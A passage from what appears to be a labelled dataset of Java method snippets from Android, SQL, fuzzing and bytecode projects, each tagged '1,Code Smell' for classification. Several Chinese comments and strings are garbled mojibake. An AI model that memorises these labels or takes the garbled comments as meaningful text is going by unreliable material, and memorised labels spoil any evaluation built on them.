    logger.error(e.getMessage(),e);
    return Result.error(HttpStatus.INTERNAL_SERVER_ERROR.value(),e);
  }
}",1,Code Smell
"public static long ways(int N,int M){
  if (N < 1 || M < 1 || ((N * M) & 1) != 0) {
    return 0;
  }
  if (N == 1 || M == 1) {
    return 1;
  }
  int big=N > M ? N : M;
  int small=big == N ? M : N;
  int sn=1 << small;
  int limit=sn - 1;
  long[] dp=new long[sn];
  dp[limit]=1;
  long[] cur=new long[sn];
  for (int level=0; level < big; level++) {
    for (int status=0; status < sn; status++) {
      if (dp[status] != 0) {
        int op=(~status) & limit;
        dfs(dp[status],op,0,small - 1,cur);
      }
    }
    for (int i=0; i < sn; i++) {
      dp[i]=0;
    }
    long[] tmp=dp;
    dp=cur;
    cur=tmp;
  }
  return dp[limit];
}",1,Code Smell
"@Test public void testMixSqlWithSubQuery(){
  String sql=""SELECT dep_id, (SELECT COUNT(stu_id) FROM action_required.homework_content)"" + "" FROM edu_manage.department WHERE dep_id = 1"";
  QueryProcedure queryProcedure=new QueryProcedureProducer(getSchemaPath(Arrays.asList(MYSQL_TABLE_NAME,HIVE_TABLE_NAME)),SqlRunner.builder().setTransformRunner(SqlRunner.Builder.RunnerType.SPARK)).createQueryProcedure(sql);
  List<Class> extractorList=getExtractorList(queryProcedure);
  if (extractorList.contains(HiveExtractor.class) && extractorList.contains(JdbcExtractor.class) && extractorList.contains(DataSetTransformProcedure.class)) {
    Assert.assertTrue(true);
  }
}",1,Code Smell
"public void control() throws IOException {
  turnScreenOn();
  while (true) {
    int[] buffer=connection.NewreceiveControlEvent();
    if (buffer != null) {
      long now=SystemClock.uptimeMillis();
      if (buffer[2] == 0 && buffer[3] == 0) {
        if (buffer[0] == 28) {
          proximity=true;
        }
 else         if (buffer[0] == 29) {
          proximity=false;
        }
 else {
          injectKeycode(buffer[0]);
        }
      }
 else {
        int action=buffer[0];
        if (action == MotionEvent.ACTION_UP && (!device.isScreenOn() || proximity)) {
          if (hit) {
            if (now - then < 250) {
              then=0;
              hit=false;
              injectKeycode(KeyEvent.KEYCODE_POWER);
            }
 else {
              then=now;
            }
          }
 else {
            hit=true;
            then=now;
          }
        }
 else {
          if (action == MotionEvent.ACTION_DOWN) {
            lastMouseDown=now;
          }
          int button=buffer[1];
          int X=buffer[2];
          int Y=buffer[3];
          Point point=new Point(X,Y);
          Point newpoint=device.NewgetPhysicalPoint(point);
          setPointerCoords(newpoint);
          MotionEvent event=MotionEvent.obtain(lastMouseDown,now,action,1,pointerProperties,pointerCoords,0,button,1f,1f,0,0,InputDevice.SOURCE_TOUCHSCREEN,0);
          injectEvent(event);
        }
      }
    }
  }
}",1,Code Smell
"private static int mk_wcwidth(int ucs,boolean ambiguousIsDoubleWidth){
  if (ucs == 0)   return 0;
  if (ucs < 32 || (ucs >= 0x7f && ucs < 0xa0))   return -1;
  if (ambiguousIsDoubleWidth) {
    if (bisearch((char)ucs,AMBIGUOUS,AMBIGUOUS.length - 1) > 0) {
      return 2;
    }
  }
  if (bisearch((char)ucs,COMBINING,COMBINING.length - 1) > 0) {
    return 0;
  }
  return 1 + ((ucs >= 0x1100 && (ucs <= 0x115f || ucs == 0x2329 || ucs == 0x232a || (ucs >= 0x2e80 && ucs <= 0xa4cf && ucs != 0x303f) || (ucs >= 0xac00 && ucs <= 0xd7a3) || (ucs >= 0xf900 && ucs <= 0xfaff) || (ucs >= 0xfe10 && ucs <= 0xfe19) || (ucs >= 0xfe30 && ucs <= 0xfe6f) || (ucs >= 0xff00 && ucs <= 0xff60) || (ucs >= 0xffe0 && ucs <= 0xffe6) || (ucs >= 0x20000 && ucs <= 0x2fffd) || (ucs >= 0x30000 && ucs <= 0x3fffd))) ? 1 : 0);
}",1,Code Smell
"private void initializeTabHeader(int count){
  final int lookupCount=count;
  Platform.runLater(() -> {
    StackPane stackPane=(StackPane)paymentTabs.lookup("".tab-header-area"");
    if (stackPane != null) {
      tabHeader=stackPane;
      tabHeader.managedProperty().bind(tabHeader.visibleProperty());
      tabHeader.setVisible(paymentTabs.getTabs().size() > 1);
      paymentTabs.getStyleClass().remove(""initial"");
    }
 else     if (lookupCount < 20) {
      initializeTabHeader(lookupCount + 1);
    }
  }
);
}",1,Code Smell
"/** 
 * Positions the input right before the next event, and returns the kind of event found. Does not consume any data from such event, if any.
 * @return The kind of event found.
 */
private static int getNextEvent(ParsableByteArray parsableWebvttData){
  int foundEvent=EVENT_NONE;
  int currentInputPosition=0;
  while (foundEvent == EVENT_NONE) {
    currentInputPosition=parsableWebvttData.getPosition();
    String line=parsableWebvttData.readLine();
    if (line == null) {
      foundEvent=EVENT_END_OF_FILE;
    }
 else     if (STYLE_START.equals(line)) {
      foundEvent=EVENT_STYLE_BLOCK;
    }
 else     if (line.startsWith(COMMENT_START)) {
      foundEvent=EVENT_COMMENT;
    }
 else {
      foundEvent=EVENT_CUE;
    }
  }
  parsableWebvttData.setPosition(currentInputPosition);
  return foundEvent;
}",1,Code Smell
"/** 
 * compare loginUser level
 * @param peek
 * @param cur
 * @return true or false
 */
private static boolean compare(String peek,String cur){
  if (MULTIPLY_STRING.equals(peek) && (DIVISION_STRING.equals(cur) || MULTIPLY_STRING.equals(cur) || ADD_STRING.equals(cur)|| SUBTRACT_STRING.equals(cur))) {
    return true;
  }
 else   if (DIVISION_STRING.equals(peek) && (DIVISION_STRING.equals(cur) || MULTIPLY_STRING.equals(cur) || ADD_STRING.equals(cur)|| SUBTRACT_STRING.equals(cur))) {
    return true;
  }
 else   if (ADD_STRING.equals(peek) && (ADD_STRING.equals(cur) || SUBTRACT_STRING.equals(cur))) {
    return true;
  }
 else {
    return SUBTRACT_STRING.equals(peek) && (ADD_STRING.equals(cur) || SUBTRACT_STRING.equals(cur));
  }
}
",1,Code Smell
"private void seekToTimeBarPosition(Player player,long positionMs){
  int windowIndex;
  Timeline timeline=player.getCurrentTimeline();
  if (multiWindowTimeBar && !timeline.isEmpty()) {
    int windowCount=timeline.getWindowCount();
    windowIndex=0;
    while (true) {
      long windowDurationMs=timeline.getWindow(windowIndex,window).getDurationMs();
      if (positionMs < windowDurationMs) {
        break;
      }
 else       if (windowIndex == windowCount - 1) {
        positionMs=windowDurationMs;
        break;
      }
      positionMs-=windowDurationMs;
      windowIndex++;
    }
  }
 else {
    windowIndex=player.getCurrentWindowIndex();
  }
  boolean dispatched=seekTo(player,windowIndex,positionMs);
  if (!dispatched) {
    updateProgress();
  }
}",1,Code Smell
"@Override public void check() throws SQLException {
  super.check();
  DorisAggregateFunction aggregateFunction=Randomly.fromOptions(DorisAggregateFunction.MAX,DorisAggregateFunction.MIN,DorisAggregateFunction.SUM,DorisAggregateFunction.COUNT,DorisAggregateFunction.AVG);
  NewFunctionNode<DorisExpression,DorisAggregateFunction> aggregate=(DorisAggregateOperation)gen.generateArgsForAggregate(aggregateFunction);
  List<Node<DorisExpression>> fetchColumns=new ArrayList<>();
  fetchColumns.add(aggregate);
  while (Randomly.getBooleanWithRatherLowProbability()) {
    fetchColumns.add((DorisAggregateOperation)gen.generateAggregate());
  }
  select.setFetchColumns(Arrays.asList(aggregate));
  if (Randomly.getBooleanWithRatherLowProbability()) {
    List<Node<DorisExpression>> constants=new ArrayList<>();
    constants.add(new DorisConstant.DorisIntConstant(Randomly.smallNumber() % select.getFetchColumns().size() + 1));
    select.setOrderByClauses(constants);
  }
  originalQuery=DorisToStringVisitor.asString(select);
  firstResult=getAggregateResult(originalQuery);
  metamorphicQuery=createMetamorphicUnionQuery(select,aggregate,select.getFromList());
  secondResult=getAggregateResult(metamorphicQuery);
  state.getState().getLocalState().log(""--"" + originalQuery + "";\n--""+ metamorphicQuery+ ""\n-- ""+ firstResult+ ""\n-- ""+ secondResult);
  if (firstResult == null && secondResult != null || firstResult != null && (!firstResult.contentEquals(secondResult) && !ComparatorHelper.isEqualDouble(firstResult,secondResult))) {
    throw new AssertionError();
  }
}",1,Code Smell
"private void updateTileView(LinearLayout tileView,int state){
  try {
    setTouchListener(tileView);
    Resources res=mContext.getResources();
    mVolumePercentageDrawable.setTint((isDarkMode() || !lightQSHeaderEnabled) && state != STATE_ACTIVE ? Color.WHITE : Color.BLACK);
    LayerDrawable layerDrawable;
    try {
      layerDrawable=new LayerDrawable(new Drawable[]{(Drawable)getObjectField(tileView,""backgroundDrawable""),mVolumePercentageDrawable});
    }
 catch (    Throwable ignored) {
      layerDrawable=new LayerDrawable(new Drawable[]{(Drawable)getObjectField(tileView,""colorBackgroundDrawable""),mVolumePercentageDrawable});
    }
    if (layerDrawable == null)     return;
    tileView.setBackground(layerDrawable);
    TextView label=(TextView)getObjectField(tileView,""label"");
    @SuppressLint(""DiscouragedApi"") String newLabel=String.format(""%s - %s%%"",res.getText(res.getIdentifier(""media_output_dialog_accessibility_seekbar"",""string"",mContext.getPackageName())),currentPct);
    label.setText(newLabel);
    ((View)getObjectField(tileView,""chevronView"")).setVisibility(GONE);
  }
 catch (  Throwable ignored) {
  }
}
",1,Code Smell
"/** 
 * 鏍规嵁姝ｅ湪杩愯鐨勪换鍔¤妭鐐癸紝杩唬鑾峰彇瀛愮骇浠诲姟鑺傜偣鍒楄〃锛屽悜鍚庢壘
 * @param source          璧峰鑺傜偣
 * @param runTaskKeyList  姝ｅ湪杩愯鐨勪换鍔� Key锛岀敤浜庢牎楠屼换鍔¤妭鐐规槸鍚︽槸姝ｅ湪杩愯鐨勮妭鐐�
 * @param hasSequenceFlow 宸茬粡缁忚繃鐨勮繛绾跨殑 ID锛岀敤浜庡垽鏂嚎璺槸鍚﹂噸澶�
 * @param userTaskList    闇�瑕佹挙鍥炵殑鐢ㄦ埛浠诲姟鍒楄〃
 * @return 瀛愮骇浠诲姟鑺傜偣鍒楄〃
 */
public static List<UserTask> iteratorFindChildUserTasks(FlowElement source,List<String> runTaskKeyList,Set<String> hasSequenceFlow,List<UserTask> userTaskList){
  hasSequenceFlow=hasSequenceFlow == null ? new HashSet<>() : hasSequenceFlow;
  userTaskList=userTaskList == null ? new ArrayList<>() : userTaskList;
  if (source instanceof StartEvent && source.getSubProcess() != null) {
    userTaskList=iteratorFindChildUserTasks(source.getSubProcess(),runTaskKeyList,hasSequenceFlow,userTaskList);
  }
  List<SequenceFlow> sequenceFlows=getElementOutgoingFlows(source);
  if (sequenceFlows == null) {
    return userTaskList;
  }
  for (  SequenceFlow sequenceFlow : sequenceFlows) {
    if (hasSequenceFlow.contains(sequenceFlow.getId())) {
      continue;
    }
    hasSequenceFlow.add(sequenceFlow.getId());
    if (sequenceFlow.getTargetFlowElement() instanceof UserTask && runTaskKeyList.contains((sequenceFlow.getTargetFlowElement()).getId())) {
      userTaskList.add((UserTask)sequenceFlow.getTargetFlowElement());
      continue;
    }
    if (sequenceFlow.getTargetFlowElement() instanceof SubProcess) {
      List<UserTask> childUserTaskList=iteratorFindChildUserTasks((FlowElement)(((SubProcess)sequenceFlow.getTargetFlowElement()).getFlowElements().toArray()[0]),runTaskKeyList,hasSequenceFlow,null);
      if (CollUtil.isNotEmpty(childUserTaskList)) {
        userTaskList.addAll(childUserTaskList);
        continue;
      }
    }
    userTaskList=iteratorFindChildUserTasks(sequenceFlow.getTargetFlowElement(),runTaskKeyList,hasSequenceFlow,userTaskList);
  }
  return userTaskList;
}",1,Code Smell
"public static Object convertFieldValue(Integer type,Object objValue,Integer isFixed){
  Object value;
  if (type == FieldTypeEnum.NUMBER.getValue() || (type == FieldTypeEnum.SELECT.getValue() && isFixed == IsEnum.YES.getValue())) {
    value=Convert.toInt(objValue);
  }
 else {
    value=Convert.toStr(objValue);
  }
  return value;
}
",1,Code Smell
"/** 
 * append Obj
 * @param key
 * @param value
 * @param json  ""key"":value or value
 */
private void writeObjItem(String key,Object value,StringBuilder json){
  if (key != null) {
    json.append(STR_SLASH).append(key).append(STR_SLASH_STR);
  }
  if (value == null) {
    json.append(""null"");
  }
 else   if (value instanceof String || value instanceof Byte || value instanceof CharSequence) {
    json.append(STR_SLASH).append(value.toString()).append(STR_SLASH);
  }
 else   if (value instanceof Boolean || value instanceof Short || value instanceof Integer|| value instanceof Long|| value instanceof Float|| value instanceof Double) {
    json.append(value);
  }
 else   if (value instanceof Object[] || value instanceof Collection) {
    Collection valueColl=null;
    if (value instanceof Object[]) {
      Object[] valueArr=(Object[])value;
      valueColl=Arrays.asList(valueArr);
    }
 else     if (value instanceof Collection) {
      valueColl=(Collection)value;
    }
    json.append(STR_ARRAY_LEFT);
    if (valueColl.size() > 0) {
      for (      Object obj : valueColl) {
        writeObjItem(null,obj,json);
        json.append(STR_COMMA);
      }
      json.delete(json.length() - 1,json.length());
    }
    json.append(STR_ARRAY_RIGHT);
  }
 else   if (value instanceof Map) {
    Map<?,?> valueMap=(Map<?,?>)value;
    json.append(STR_OBJECT_LEFT);
    if (!valueMap.isEmpty()) {
      Set<?> keys=valueMap.keySet();
      for (      Object valueMapItemKey : keys) {
        writeObjItem(valueMapItemKey.toString(),valueMap.get(valueMapItemKey),json);
        json.append(STR_COMMA);
      }
      json.delete(json.length() - 1,json.length());
    }
    json.append(STR_OBJECT_RIGHT);
  }
 else {
    json.append(STR_OBJECT_LEFT);
    Field[] fields=getDeclaredFields(value.getClass());
    if (fields.length > 0) {
      for (      Field field : fields) {
        Object fieldObj=getFieldObject(field,value);
        writeObjItem(field.getName(),fieldObj,json);
        json.append(STR_COMMA);
      }
      json.delete(json.length() - 1,json.length());
    }
    json.append(STR_OBJECT_RIGHT);
  }
}",1,Code Smell
"private void setTouchListener(View tileView){
  tileView.setOnTouchListener(new View.OnTouchListener(){
    float initX=0;
    float initPct=0;
    @SuppressLint({""DiscouragedApi"",""ClickableViewAccessibility""}) @Override public boolean onTouch(    View view,    MotionEvent motionEvent){
switch (motionEvent.getAction()) {
case MotionEvent.ACTION_DOWN:
{
          initX=motionEvent.getX();
          initPct=initX / view.getWidth();
          return true;
        }
case MotionEvent.ACTION_MOVE:
{
        float deltaMove=Math.abs(initX - motionEvent.getX()) / view.getWidth();
        if (deltaMove > .03) {
          int newPct=clampPctToSteps(round(max(min((motionEvent.getX() / view.getWidth()),1),0) * 100f));
          if (newPct != currentPct) {
            setPct(newPct);
            view.getParent().requestDisallowInterceptTouchEvent(true);
            moved=true;
            changeVolume(currentPct);
          }
        }
        return true;
      }
case MotionEvent.ACTION_UP:
{
      if (moved) {
        moved=false;
      }
 else {
        if (QSHapticEnabled)         vibrate(EFFECT_CLICK,USAGE_TOUCH);
        toggleMute();
      }
      return true;
    }
}
return true;
}
}
);
}",1,Code Smell
"private void restartAnimation(){
  if (isSinglePart()) {
    if (animateQRService != null) {
      animateQRService.cancel();
    }
    nextPart();
    qrImageView.setImage(getQrCode(currentPart));
  }
 else   if (animateQRService == null) {
    createAnimateQRService();
  }
 else   if (!animateQRService.isRunning()) {
    animateQRService.reset();
    animateQRService.start();
  }
}
",1,Code Smell
"/** 
 * Returns whether the given variables are never alive at the same time.
 */
private boolean areNonOverlapping(int variableIndex1,int variableIndex2,int codeLength){
  for (int offset=0; offset < codeLength; offset++) {
    if ((livenessAnalyzer.isAliveBefore(offset,variableIndex1) && livenessAnalyzer.isAliveBefore(offset,variableIndex2)) || (livenessAnalyzer.isAliveAfter(offset,variableIndex1) && livenessAnalyzer.isAliveAfter(offset,variableIndex2)) || livenessAnalyzer.isCategory2(offset,variableIndex1)) {
      return false;
    }
  }
  return true;
}",1,Code Smell
"@RequestMapping(""/allDomNames"") public JSONObject allDomNames(HttpServletRequest request) throws Exception {
  boolean responsibleOnly=Boolean.parseBoolean(WebUtils.optional(request,""responsibleOnly"",""false""));
  Map<String,Set<String>> domMap=serviceManager.getAllServiceNames();
  JSONObject result=new JSONObject();
  String dnsfVersion=""1.0.1"";
  String agent=request.getHeader(""Client-Version"");
  ClientInfo clientInfo=new ClientInfo(agent);
  if (clientInfo.type == ClientInfo.ClientType.DNS && clientInfo.version.compareTo(VersionUtil.parseVersion(dnsfVersion)) <= 0) {
    List<String> doms=new ArrayList<String>();
    Set<String> domSet=null;
    if (domMap.containsKey(Constants.DEFAULT_NAMESPACE_ID)) {
      domSet=domMap.get(Constants.DEFAULT_NAMESPACE_ID);
    }
    if (CollectionUtils.isEmpty(domSet)) {
      result.put(""doms"",new HashSet<>());
      result.put(""count"",0);
      return result;
    }
    for (    String dom : domSet) {
      if (distroMapper.responsible(dom) || !responsibleOnly) {
        doms.add(NamingUtils.getServiceName(dom));
      }
    }
    result.put(""doms"",doms);
    result.put(""count"",doms.size());
    return result;
  }
  Map<String,Set<String>> doms=new HashMap<>(16);
  int count=0;
  for (  String namespaceId : domMap.keySet()) {
    doms.put(namespaceId,new HashSet<>());
    for (    String dom : domMap.get(namespaceId)) {
      if (distroMapper.responsible(dom) || !responsibleOnly) {
        doms.get(namespaceId).add(NamingUtils.getServiceName(dom));
      }
    }
    count+=doms.get(namespaceId).size();
  }
  result.put(""doms"",doms);
  result.put(""count"",count);
  return result;
}",1,Code Smell
"@Override public void run(){
  Looper.prepare();
  if (ex instanceof Resources.NotFoundException || ex instanceof InflateException || (ex.getMessage() != null && ex.getMessage().contains(""XML""))) {
    Toast toast=Toast.makeText(mContext,""你使用的是二次打包(如QQ传应用，APKPURE，应用备份等等)的应用,请清除数据,前往google play或者设置中的github项目地址进行安装:\r\n"" + ex.getMessage(),Toast.LENGTH_LONG);
    toast.setGravity(Gravity.CENTER,0,0);
    toast.show();
  }
 else   if (DEBUG) {
    Toast toast=Toast.makeText(mContext,""程序出错，即将退出:\r\n"" + ex.getMessage(),Toast.LENGTH_LONG);
    toast.setGravity(Gravity.CENTER,0,0);
    toast.show();
  }
  Looper.loop();
}",1,Code Smell
"@SuppressWarnings(""deprecation"") public void bindConn(Context context,ConnectionDescriptor conn,AppsResolver apps,Drawable unknownIcon){
  AppDescriptor app=apps.getAppByUid(conn.uid,0);
  Drawable appIcon;
  String l7Text;
  appIcon=((app != null) && (app.getIcon() != null)) ? app.getIcon() : unknownIcon;
  icon.setImageDrawable(appIcon);
  if ((conn.info != null) && (conn.info.length() > 0))   remote.setText(conn.info);
 else   remote.setText(conn.dst_ip);
  if (conn.dst_port != 0)   l7Text=String.format(mProtoAndPort,conn.l7proto,conn.dst_port);
 else   l7Text=conn.l7proto;
  if (conn.ipver == 6)   l7Text=l7Text + "", IPv6"";
  l7proto.setText(l7Text);
  String info_txt=(app != null) ? app.getName() : Integer.toString(conn.uid);
  appName.setText(info_txt);
  traffic.setText(Utils.formatBytes(conn.sent_bytes + conn.rcvd_bytes));
  lastSeen.setText(Utils.formatEpochShort(context,conn.last_seen / 1000));
  statusInd.setText(conn.getStatusLabel(context));
  int color;
  if (conn.status < ConnectionDescriptor.CONN_STATUS_CLOSED)   color=R.color.statusOpen;
 else   if ((conn.status == ConnectionDescriptor.CONN_STATUS_CLOSED) || (conn.status == ConnectionDescriptor.CONN_STATUS_RESET))   color=R.color.statusClosed;
 else   color=R.color.statusError;
  statusInd.setTextColor(ContextCompat.getColor(context,color));
  jsInjectorInd.setVisibility(((conn.js_injected_scripts != null) && !conn.js_injected_scripts.isEmpty()) ? View.VISIBLE : View.GONE);
  blacklistedInd.setVisibility(conn.isBlacklisted() ? View.VISIBLE : View.GONE);
  blockedInd.setVisibility(conn.is_blocked ? View.VISIBLE : View.GONE);
  redirectedInd.setVisibility((conn.isPortMappingApplied() && !conn.is_blocked) ? View.VISIBLE : View.GONE);
  if (CaptureService.isDecryptingTLS()) {
    decryptionInd.setVisibility(View.VISIBLE);
    Utils.setDecryptionIcon(decryptionInd,conn);
  }
 else   decryptionInd.setVisibility(View.GONE);
}",1,Code Smell
"@Override public void onTickle(){
  if (getVisibility() == View.VISIBLE) {
    String time;
    if (mIsDateEnabled && !mIsTimeEnabled) {
      time=DateFormatter.getCurrentDateShort(getContext());
    }
 else     if (!mIsDateEnabled && mIsTimeEnabled) {
      time=DateFormatter.getCurrentTimeShort(getContext());
    }
 else {
      time=DateFormatter.getCurrentDateTimeShort(getContext());
    }
    setText(time);
  }
}
",1,Code Smell
"/** 
 * Checks the specified class (if any), printing notes if necessary.
 */
private void checkClassName(String className){
  if (className != null && !containsWildCards(className) && programClassPool.getClass(className) == null && libraryClassPool.getClass(className) == null && notePrinter.accepts(className)) {
    notePrinter.print(className,""Note: the configuration refers to the unknown class '"" + ClassUtil.externalClassName(className) + ""'"");
    int lastSeparatorIndex=className.lastIndexOf(TypeConstants.PACKAGE_SEPARATOR);
    String fullyQualifiedClassName=className.endsWith(INVALID_CLASS_EXTENSION) ? className.substring(0,lastSeparatorIndex) : ""**"" + TypeConstants.PACKAGE_SEPARATOR + className.substring(lastSeparatorIndex + 1);
    ClassNameFilter classNameFilter=new ClassNameFilter(fullyQualifiedClassName,this);
    programClassPool.classesAccept(classNameFilter);
    libraryClassPool.classesAccept(classNameFilter);
  }
}",1,Code Smell
"public void apply(CarriageContraptionEntity entity,Carriage carriage){
  DimensionalCarriageEntity dce=carriage.getDimensional(entity.level());
  fallbackPointSnapshot=null;
  if (fallbackLocations != null) {
    fallbackPointSnapshot=Pair.of(dce.positionAnchor,dce.rotationAnchors);
    dce.pointsInitialised=true;
    return;
  }
  TrackGraph graph=carriage.train.graph;
  if (graph == null)   return;
  for (int i=0; i < wheelLocations.size(); i++) {
    Pair<Couple<Integer>,Float> pair=wheelLocations.get(i);
    if (pair == null)     break;
    CarriageBogey bogey=carriage.bogeys.get(i / 2 == 0);
    TravellingPoint bogeyPoint=bogey.points.get(i % 2 == 0);
    TravellingPoint point=dce.pointsInitialised ? pointsToApproach[i] : bogeyPoint;
    Couple<TrackNode> nodes=pair.getFirst().map(graph::getNode);
    if (nodes.either(Objects::isNull))     continue;
    TrackEdge edge=graph.getConnectionsFrom(nodes.getFirst()).get(nodes.getSecond());
    if (edge == null)     continue;
    point.node1=nodes.getFirst();
    point.node2=nodes.getSecond();
    point.edge=edge;
    point.position=pair.getSecond();
    if (dce.pointsInitialised) {
      float foundDistance=-1;
      boolean direction=false;
      for (      boolean forward : Iterate.trueAndFalse) {
        float distanceTo=getDistanceTo(graph,bogeyPoint,point,foundDistance,forward);
        if (distanceTo > 0 && (foundDistance == -1 || distanceTo < foundDistance)) {
          foundDistance=distanceTo;
          direction=forward;
        }
      }
      if (foundDistance != -1) {
        pointDistanceSnapshot[i]=(direction ? 1 : -1) * foundDistance;
      }
 else {
        bogeyPoint.node1=point.node1;
        bogeyPoint.node2=point.node2;
        bogeyPoint.edge=point.edge;
        bogeyPoint.position=point.position;
        pointDistanceSnapshot[i]=0;
      }
    }
  }
  if (!dce.pointsInitialised) {
    carriage.train.navigation.distanceToDestination=distanceToDestination;
    dce.pointsInitialised=true;
    return;
  }
  if (!leadingCarriage)   return;
  destinationDistanceSnapshot=(float)(distanceToDestination - carriage.train.navigation.distanceToDestination);
}",1,Code Smell
"/** 
 * Converts a query's ORDER BY clause, if any. <p>Ignores the ORDER BY clause if the query is not top-level and FETCH or OFFSET are not present.
 * @param select        Query
 * @param bb            Blackboard
 * @param collation     Collation list
 * @param orderExprList Method populates this list with orderBy expressionsnot present in selectList
 * @param offset        Expression for number of rows to discard beforereturning first row
 * @param fetch         Expression for number of rows to fetch
 */
protected void convertOrder(SqlSelect select,Blackboard bb,RelCollation collation,List<SqlNode> orderExprList,SqlNode offset,SqlNode fetch){
  if (!bb.top || select.getOrderList() == null || select.getOrderList().getList().isEmpty()) {
    assert !bb.top || collation.getFieldCollations().isEmpty();
    if ((offset == null || (offset instanceof SqlLiteral && ((SqlLiteral)offset).bigDecimalValue().equals(BigDecimal.ZERO))) && fetch == null) {
      return;
    }
  }
  bb.setRoot(LogicalSort.create(bb.root,collation,offset == null ? null : convertExpression(offset),fetch == null ? null : convertExpression(fetch)),false);
  if (orderExprList.size() > 0 && !bb.top) {
    final List<RexNode> exprs=new ArrayList<>();
    final RelDataType rowType=bb.root.getRowType();
    final int fieldCount=rowType.getFieldCount() - orderExprList.size();
    for (int i=0; i < fieldCount; i++) {
      exprs.add(rexBuilder.makeInputRef(bb.root,i));
    }
    bb.setRoot(LogicalProject.create(bb.root,exprs,rowType.getFieldNames().subList(0,fieldCount)),false);
  }
}",1,Code Smell
"public static List<MessagePageResponse> toMessagePageResponses(List<Message> messages,List<User> users,List<BasePosts> postsList,User loginUser){
  List<MessagePageResponse> res=new ArrayList<>();
  SafesUtil.ofList(messages).forEach(message -> {
    MessagePageResponse messagePageResponse=MessagePageResponse.builder().id(message.getId()).read(message.getRead().getValue()).sender(message.getSender().getId()).typeDesc(message.getType().getDesc()).createAt(message.getCreateAt()).build();
    SafesUtil.ofList(users).forEach(user -> {
      if (user.getId().toString().equals(message.getSender().getId())) {
        messagePageResponse.setSenderName(user.getNickname());
        messagePageResponse.setSenderAvatar(user.getAvatar());
      }
    }
);
    if (MessageTypeEn.APPROVAL_ARTICLE.equals(message.getType()) || MessageTypeEn.APPROVAL_FAQ.equals(message.getType()) || MessageTypeEn.COMMENT_ARTICLE.equals(message.getType())|| MessageTypeEn.COMMENT_FAQ.equals(message.getType())) {
      SafesUtil.ofList(postsList).forEach(posts -> {
        if (posts.getId().equals(Long.valueOf(message.getTitle()))) {
          messagePageResponse.setTitle(posts.getTitle());
          messagePageResponse.setInfoId(posts.getId().toString());
        }
      }
);
    }
    if (MessageTypeEn.FOLLOW_USER.equals(message.getType())) {
      messagePageResponse.setTitle(""鍏虫敞浜嗕綘"");
      messagePageResponse.setInfoId(loginUser.getId().toString());
    }
    res.add(messagePageResponse);
  }
);
  return res;
}
",1,Code Smell
"@Override public boolean initOnce(){
  try {
    Method revokeMsg=null;
    for (    Method m : _QQMessageFacade().getDeclaredMethods()) {
      if (m.getReturnType().equals(void.class)) {
        Class<?>[] argt=m.getParameterTypes();
        if (argt.length == 2 && argt[0].equals(ArrayList.class) && argt[1].equals(boolean.class)) {
          revokeMsg=m;
          break;
        }
      }
    }
    XposedBridge.hookMethod(revokeMsg,new XC_MethodHook(-10086){
      @Override protected void beforeHookedMethod(      MethodHookParam param) throws Throwable {
        mQQMsgFacade=param.thisObject;
        if (LicenseStatus.sDisableCommonHooks) {
          return;
        }
        if (!isEnabled()) {
          return;
        }
        ArrayList list=(ArrayList)param.args[0];
        param.setResult(null);
        if (list == null || list.isEmpty()) {
          return;
        }
        for (        Object revokeMsgInfo : list) {
          try {
            onRevokeMsg(revokeMsgInfo);
          }
 catch (          Throwable t) {
            log(t);
          }
        }
        list.clear();
      }
    }
);
    return true;
  }
 catch (  Throwable e) {
    log(e);
    return false;
  }
}",1,Code Smell
"protected void openKeyboardInternal(){
  showPopup(AndroidUtilities.usingHardwareInput || isPaused ? 0 : 2);
  editText.requestFocus();
  AndroidUtilities.showKeyboard(editText);
  if (isPaused) {
    showKeyboardOnResume=true;
  }
 else   if (!AndroidUtilities.usingHardwareInput && !keyboardVisible && !AndroidUtilities.isInMultiwindow&& !AndroidUtilities.isTablet()) {
    waitingForKeyboardOpen=true;
    AndroidUtilities.cancelRunOnUIThread(openKeyboardRunnable);
    AndroidUtilities.runOnUIThread(openKeyboardRunnable,100);
  }
}",1,Code Smell
"/** 
 * In order to increase re-usability we will create a synthetic Schema object that will resemble the Schemas used by POST requests. This will allow us to use the same code to fuzz the requests. We will also do another ""hack"" so that required Parameters are also marked as required in their corresponding schema <p> Parameters supplied via the `urlParams` argument are not fuzzed.
 * @param operationParameters the parameters defined in the OpenAPI contract
 * @return a Schema associated with the GET request which resembles the model for POST
 */
private Schema<?> createSyntheticSchemaForGet(List<Parameter> operationParameters){
  Schema<?> syntheticSchema=CatsModelUtils.newObjectSchema();
  syntheticSchema.setProperties(new LinkedHashMap<>());
  List<String> required=new ArrayList<>();
  for (  Parameter parameter : Optional.ofNullable(operationParameters).orElseGet(Collections::emptyList)) {
    boolean isPathParam=""path"".equalsIgnoreCase(parameter.getIn());
    boolean isQueryParam=""query"".equalsIgnoreCase(parameter.getIn());
    if ((isPathParam || isQueryParam) && filesArguments.isNotUrlParam(parameter.getName())) {
      String newParameterName=parameter.getName() + ""|"" + parameter.getIn();
      parameter.setSchema(Optional.ofNullable(parameter.getSchema()).orElse(new Schema<>()));
      parameter.getSchema().setName(newParameterName);
      syntheticSchema.addProperty(parameter.getName(),parameter.getSchema());
      if (parameter.getSchema().getExample() == null) {
        parameter.getSchema().setExample(parameter.getExample());
      }
      if (parameter.getRequired() != null && parameter.getRequired()) {
        required.add(parameter.getName());
      }
    }
  }
  syntheticSchema.setRequired(required);
  return syntheticSchema;
}
private KeyValuePair<String,Schema<?>> createSyntheticSchemaForGet(Operation operation){
  Schema<?> syntheticSchema=this.createSyntheticSchemaForGet(operation.getParameters());
  globalContext.getSchemaMap().put(SYNTH_SCHEMA_NAME + operation.getOperationId(),syntheticSchema);
  return new KeyValuePair<>(SYNTH_SCHEMA_NAME + operation.getOperationId(),syntheticSchema);
}
",1,Code Smell
"@Override protected void onHiddenLinkClicked(){
  String text;
  if ((slug == null || slug.isEmpty()) && giftCode.to_id == NO_USER_ID) {
    text=LocaleController.getString(""BoostingOnlyGiveawayCreatorSeeLink"",R.string.BoostingOnlyGiveawayCreatorSeeLink);
  }
 else {
    text=LocaleController.getString(""BoostingOnlyRecipientCode"",R.string.BoostingOnlyRecipientCode);
  }
  BulletinFactory.of(container,resourcesProvider).createSimpleBulletin(R.raw.chats_infotip,text).show(true);
}
",1,Code Smell
"public void visitParameter(Clazz clazz,Member member,int parameterIndex,int parameterCount,int parameterOffset,int parameterSize,String parameterType,Clazz referencedClass){
  if (!ClassUtil.isInternalPrimitiveType(parameterType.charAt(0)) && !ClassUtil.isInternalArrayType(parameterType) && isSimpleEnum(referencedClass)) {
    int stackEntryIndex=parameterSize - parameterOffset - 1;
